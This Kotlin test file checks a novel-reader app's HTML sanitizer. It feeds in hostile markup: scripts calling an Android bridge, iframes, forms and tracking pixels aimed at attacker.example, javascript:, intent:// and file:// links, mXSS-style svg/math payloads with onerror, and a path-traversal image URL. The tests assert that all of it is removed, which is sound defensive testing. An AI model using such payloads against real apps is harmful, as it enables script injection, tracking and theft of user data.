package hayai.novel.reader.security

import eu.kanade.tachiyomi.ui.reader.viewer.text.NovelViewerTextUtils
import org.jsoup.Jsoup
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test

class NovelHtmlSanitizerTest {

    @Test
    fun `removes active elements and executable attributes`() {
        val sanitized = NovelHtmlSanitizer.sanitize(
            """
            <base href="https://attacker.example/">
            <style>@import 'https://attacker.example/style.css';</style>
            <script>Android.onSaveProgress(100)</script>
            <noscript>hidden fallback</noscript>
            <iframe srcdoc="<script>alert(1)</script>" src="https://attacker.example/frame"></iframe>
            <object data="https://attacker.example/payload"></object>
            <embed src="https://attacker.example/payload">
            <form action="https://attacker.example/collect"><input name="secret"><button>Send</button></form>
            <p id="reader-root" class="chapter-transition" style="background:url(https://attacker.example/pixel)" onclick="Android.onSaveProgress(100)">Safe chapter</p>
            """.trimIndent(),
        )

        val body = Jsoup.parseBodyFragment(sanitized).body()
        assertEquals("Safe chapter", body.text())
        assertTrue(body.select("script,style,noscript,iframe,object,embed,form,input,button,base").isEmpty())
        assertFalse(sanitized.contains("Android"))
        assertFalse(sanitized.contains("attacker.example"))
        assertFalse(sanitized.contains("onclick"))
        assertFalse(sanitized.contains("style="))
        assertFalse(sanitized.contains("id="))
        assertFalse(sanitized.contains("class="))
    }

    @Test
    fun `preserves reader semantics while dropping dangerous links`() {
        val sanitized = NovelHtmlSanitizer.sanitize(
            """
            <article lang="pt-BR" dir="ltr">
              <h2>Chapter 1</h2>
              <p>Hello <strong>reader</strong>.</p>
              <blockquote><em>Quoted</em></blockquote>
              <ol start="3"><li value="5">Five</li></ol>
              <table><tr><th scope="col">A</th><td colspan="2">B</td></tr></table>
              <a href="https://example.com/next">Safe HTTPS</a>
              <a href="javascript:Android.onSaveProgress(100)">JS</a>
              <a href="intent://attack">Intent</a>
              <a href="file:///data/data/app.epigraph.mobile/private">File</a>
            </article>
            """.trimIndent(),
        )

        val body = Jsoup.parseBodyFragment(sanitized).body()
        assertEquals("pt-BR", body.selectFirst("article")?.attr("lang"))
        assertEquals("3", body.selectFirst("ol")?.attr("start"))
        assertEquals("2", body.selectFirst("td")?.attr("colspan"))
        assertEquals("https://example.com/next", body.select("a")[0].attr("href"))
        assertEquals("nofollow noopener noreferrer", body.select("a")[0].attr("rel"))
        assertFalse(body.select("a")[1].hasAttr("href"))
        assertFalse(body.select("a")[2].hasAttr("href"))
        assertFalse(body.select("a")[3].hasAttr("href"))
    }

    @Test
    fun `images only accept app owned paths or inline raster bytes`() {
        val sanitized = NovelHtmlSanitizer.sanitize(
            """
            <img src="hayai-novel-image://chapter/images/cover.webp" alt="local">
            <img src="data:image/png;base64,iVBORw0KGgo=" alt="inline">
            <img src="https://attacker.example/tracker.png" alt="remote">
            <img src="hayai-novel-image://chapter/%2e%2e/private.txt" alt="traversal">
            <img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Lz48L3N2Zz4=" alt="svg">
            """.trimIndent(),
        )

        val images = Jsoup.parseBodyFragment(sanitized).select("img")
        assertEquals(2, images.size)
        assertEquals("local", images[0].attr("alt"))
        assertEquals("inline", images[1].attr("alt"))
        assertTrue(images.none { it.attr("src").contains("attacker.example") })
    }

    @Test
    fun `sanitization is idempotent for malformed foreign markup`() {
        val malicious = """
            <p>Before<svg><a href="javascript:alert(1)"><script>alert(1)</script></a></svg>After
            <math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>
            <!-- hidden --><template><img src="https://attacker.example/pixel"></template>
        """.trimIndent()

        val once = NovelHtmlSanitizer.sanitize(malicious)
        val twice = NovelHtmlSanitizer.sanitize(once)

        assertEquals(once, twice)
        assertEquals("BeforeAfter", Jsoup.parseBodyFragment(once).text())
        assertFalse(once.contains("javascript:"))
        assertFalse(once.contains("onerror"))
        assertFalse(once.contains("attacker.example"))
    }

    @Test
    fun `reader paragraph pipeline sanitizes before adding app metadata`() {
        val tagged = NovelViewerTextUtils.normalizeAndTagContentForHtml(
            content = """
                <p onclick="Android.onSaveProgress(100)">First</p>
                <iframe src="https://attacker.example/frame"></iframe>
                <p><img src="https://attacker.example/pixel">Second</p>
            """.trimIndent(),
            chapterUrl = "https://source.example/chapter-1",
        )

        val body = Jsoup.parseBodyFragment(tagged.html).body()
        assertEquals(listOf("First", "Second"), tagged.paragraphs)
        assertEquals("0", body.select("p")[0].attr("data-paragraph-index"))
        assertEquals("1", body.select("p")[1].attr("data-paragraph-index"))
        assertTrue(body.select("iframe,img").isEmpty())
        assertFalse(tagged.html.contains("onclick"))
        assertFalse(tagged.html.contains("attacker.example"))
    }
}
